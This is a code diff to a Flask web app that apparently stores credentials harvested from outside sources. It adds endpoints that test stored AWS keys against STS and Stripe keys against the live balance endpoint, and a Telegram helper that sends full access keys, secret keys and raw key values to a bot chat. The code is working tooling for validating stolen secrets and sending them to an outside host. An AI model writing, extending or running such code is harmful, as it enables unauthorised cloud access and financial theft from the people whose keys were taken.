@@ -297,7 +297,7 @@ def get_statistics():
     type_counts = dict(cursor.fetchall())
 
     cursor.execute('''
-        SELECT type, key_value, source_url, timestamp, metadata, status
+        SELECT type, key_value, source_url, timestamp, metadata, status, id
         FROM credentials
         ORDER BY id DESC LIMIT 500
     ''')
@@ -6678,6 +6678,123 @@ def _serialize_credential(row) -> dict:
         'last_verified': row[8] if len(row) > 8 else None,
         'verify_meta': row[9] if len(row) > 9 else None,
     }
+
+
+def _tg_send(text: str) -> dict:
+    """Send a Telegram message using the configured bot. Returns {'ok': True} or {'ok': False, 'error': ...}."""
+    import urllib.request, urllib.parse
+    try:
+        cfg = _load_scanner_config()
+    except Exception as e:
+        return {'ok': False, 'error': f'Could not read config: {e}'}
+    tg = cfg.get('telegram') or {}
+    token = tg.get('bot_token') or ''
+    chat = tg.get('chat_id') or ''
+    if not token or not chat:
+        return {'ok': False, 'error': 'Telegram not configured'}
+    payload = urllib.parse.urlencode({'chat_id': chat, 'text': text, 'parse_mode': 'HTML'}).encode()
+    url = f'https://api.telegram.org/bot{token}/sendMessage'
+    try:
+        with urllib.request.urlopen(url, data=payload, timeout=8) as resp:
+            data = json.loads(resp.read().decode('utf-8') or '{}')
+        return {'ok': bool(data.get('ok')), 'error': data.get('description')}
+    except Exception as e:
+        return {'ok': False, 'error': str(e)}
+
+
+@app.route('/api/credentials/<int:cred_id>/recheck', methods=['POST'])
+def api_credentials_recheck(cred_id: int):
+    """Re-validate a discovered credential against its live API.
+    Currently supports AWS (STS GetCallerIdentity) and Stripe.
+    Other types return status=unchecked."""
+    try:
+        conn = sqlite3.connect(DB_PATH, timeout=30)
+        c = conn.cursor()
+        c.execute('SELECT type, key_value, source_url, metadata FROM credentials WHERE id = ?', (cred_id,))
+        row = c.fetchone()
+        if not row:
+            conn.close()
+            return jsonify({'ok': False, 'error': 'Not found'}), 404
+        cred_type, key_value, source_url, metadata = row
+
+        live = False
+        info = ''
+        try:
+            # AWS — detect AKIA format. source_url may be the access key (old format)
+            # or the domain (new format with key_value=AKIA...).
+            ak, sk = None, None
+            if cred_type == 'AWS':
+                if source_url and source_url.startswith('AKIA'):
+                    ak, sk = source_url, key_value
+                elif key_value and key_value.startswith('AKIA'):
+                    ak = key_value
+                    sk = metadata or ''
+                if ak and sk:
+                    import boto3
+                    sts = boto3.client('sts', aws_access_key_id=ak, aws_secret_access_key=sk)
+                    identity = sts.get_caller_identity()
+                    live = True
+                    info = f"Account: {identity.get('Account')} ARN: {identity.get('Arn')}"
+            elif cred_type == 'Stripe':
+                import urllib.request
+                req = urllib.request.Request(
+                    'https://api.stripe.com/v1/balance',
+                    headers={'Authorization': f'Bearer {key_value}'}
+                )
+                with urllib.request.urlopen(req, timeout=8) as r:
+                    live = r.status == 200
+                    info = 'Balance endpoint OK'
+        except Exception as e:
+            info = str(e)[:200]
+
+        new_status = 'valid' if live else 'invalid'
+        c.execute(
+            'UPDATE credentials SET status=?, last_verified=CURRENT_TIMESTAMP, verify_meta=? WHERE id=?',
+            (new_status, info, cred_id)
+        )
+        conn.commit()
+        conn.close()
+        return jsonify({'ok': True, 'live': live, 'status': new_status, 'info': info})
+    except Exception as e:
+        return jsonify({'ok': False, 'error': str(e)}), 500
+
+
+@app.route('/api/credentials/<int:cred_id>/resend', methods=['POST'])
+def api_credentials_resend(cred_id: int):
+    """Re-send the Telegram alert for a discovered credential."""
+    try:
+        conn = sqlite3.connect(DB_PATH, timeout=30)
+        c = conn.cursor()
+        c.execute('SELECT type, key_value, source_url, metadata, status FROM credentials WHERE id = ?', (cred_id,))
+        row = c.fetchone()
+        conn.close()
+        if not row:
+            return jsonify({'ok': False, 'error': 'Not found'}), 404
+        cred_type, key_value, source_url, metadata, status = row
+
+        # Build a readable message
+        ak = source_url if (source_url and source_url.startswith('AKIA')) else key_value
+        sk = key_value if (source_url and source_url.startswith('AKIA')) else (metadata or '')
+        if cred_type == 'AWS' and ak and ak.startswith('AKIA'):
+            body = (
+                f'🔑 <b>AWS Credential</b> [{status.upper()}]\n'
+                f'<code>ACCESS KEY: {ak}</code>\n'
+                f'<code>SECRET KEY: {sk}</code>\n'
+                f'<i>Source: {source_url if not source_url.startswith("AKIA") else "aws_valid"}</i>'
+            )
+        else:
+            src = source_url or ''
+            body = (
+                f'🔑 <b>{cred_type}</b> [{status.upper()}]\n'
+                f'<code>{key_value}</code>\n'
+                + (f'<i>Source: {src}</i>' if src else '')
+                + (f'\n<i>Meta: {metadata}</i>' if metadata else '')
+            )
+
+        result = _tg_send(body)
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'ok': False, 'error': str(e)}), 500
 
 
 @app.route('/api/findings/stripe', methods=['GET'])
